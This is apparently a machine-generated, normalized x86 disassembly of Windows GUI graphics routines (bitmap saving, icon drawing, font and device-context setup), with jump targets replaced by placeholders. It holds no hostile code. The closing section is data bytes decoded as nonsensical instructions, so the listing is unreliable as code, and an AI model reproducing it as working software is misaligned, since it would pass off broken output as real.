push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_428bac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429370
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_4287f8
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_42893c
mov eax esi
call sub_428a4c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_42893c
mov eax esi
call sub_428a4c
mov eax esi
call sub_4288c8
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_427f54
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_428358
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428bac
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428bac
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_4278f0
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4294a8
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42894c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_428358
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4294fc
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_42894c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_428358
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42957c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_42893c
mov eax ebx
call sub_42894c
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_4278f0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429613
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428bac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4277e8
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_423d70
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_429618
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403af8
call sub_403b4c
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4277e8
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429650
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42894c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_428358
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4296ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402d00
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4288c8
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_426ce4
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b758
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b758
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402d00
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_42878c
mov dl [ r-xdata ]
call sub_425ba0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_425eb8
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_4278a4
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b758
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41b758
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b758
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41b758
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41b758
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41b758
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_426328
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41b758
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_42664c
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42996c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_42894c
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_4278f0
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_4299e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_427f54
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429a0c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_429a54
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_427020
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_42771c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_429aa8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_427720
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_429ad8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_429db0
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_42771c
mov eax [ esi + 0x28 ]
call sub_427720
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4192f4
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_429b38
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_425ba0
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_429b90
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_429bcc
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41b514
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41b720
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_4268f8
jmp r-xdata
jmp r-xdata
call sub_425db0
sub_429c44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429cd1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_429b90
cmp eax [ rw-data ]
jne r-xdata
call sub_425db0
mov eax esi
call sub_429b90
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_426e24
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402d00
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b758
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_429cf8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429d86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41b4f4
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41b720
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b720
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_429db0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_425db0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429d8b
mov eax [ ebp - 0x4 ]
call sub_40331c
call sub_403af8
call sub_403b4c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429db0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429df0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42771c
mov eax [ ebx + 0x28 ]
call sub_427720
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429e70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_429c44
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41b758
pop esi
pop ebx
retn
sub_429ec0
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_4263f8
mov [ rw-data ] eax
pop ebx
retn
sub_429ef8
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_429f3c
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_429ef8
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42a008
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42a040
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_42a238
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42a084
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42a06c
xor eax eax
push ebp
push sub_42a125
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a12c
mov eax [ ebp - 0x4 ]
call sub_42a078
retn
mov eax 0x10
call sub_4026ec
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42a138
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42a138
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42a217
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_42878c
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_4253e8
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_4252cc
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41766c
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_425670
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_425a84
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_428448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a238
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42a06c
xor eax eax
push ebp
push sub_42a283
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a28a
mov eax [ ebp - 0x4 ]
call sub_42a078
retn
mov esp ebp
pop ebp
retn
sub_42a28a
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40270c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_40331c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42a06c
xor eax eax
push ebp
push sub_42a283
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a28a
mov eax [ ebp - 0x4 ]
call sub_42a078
retn
mov esp ebp
pop ebp
retn
sub_42a2b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_424640
push eax
mov eax ebx
call sub_424640
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42a084
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42a2e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a3b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a3b8
retn
mov eax [ rw-data ]
call sub_40331c
mov eax [ rw-data ]
call sub_40331c
mov eax [ rw-data ]
call sub_40331c
call sub_427400
mov eax [ rw-data ]
call sub_40331c
mov eax [ rw-data ]
call sub_40331c
mov eax [ rw-data ]
call sub_40331c
mov eax [ rw-data ]
call sub_40331c
mov eax [ rw-data ]
call sub_40331c
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404bb4
sub_42a3bc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_429ec0
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_429f3c
mov cx 0x2c
mov dl 0x1
mov eax [ sub_423d84 ]
call sub_423df8
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_423d84 ]
call sub_423df8
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_423d84 ]
call sub_423df8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a008
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418f64
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418f64
mov [ rw-data ] eax
mov ecx sub_424650
mov edx sub_424660
mov eax [ r-xdata ]
call sub_4184b8
mov ecx r-xdata
mov edx sub_424868
mov eax [ r-xdata ]
call sub_4184b8
sub_42a4c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a4ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a4f4
retn
sub_42a504
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
movsd [ edi ] [ esi ]
inc edx
add [ eax + eax ] dl
add [ eax ] al
insb
arpl [ ecx ] ax
dec esp
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + ecx * 4 + 0x41 ] bh
add [ eax ] ah
lea eax [ ecx ]
mov [ esi - 0x742fffbe ] ah
inc ecx
add [ esp + ecx * 4 + 0x41 ] cl
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
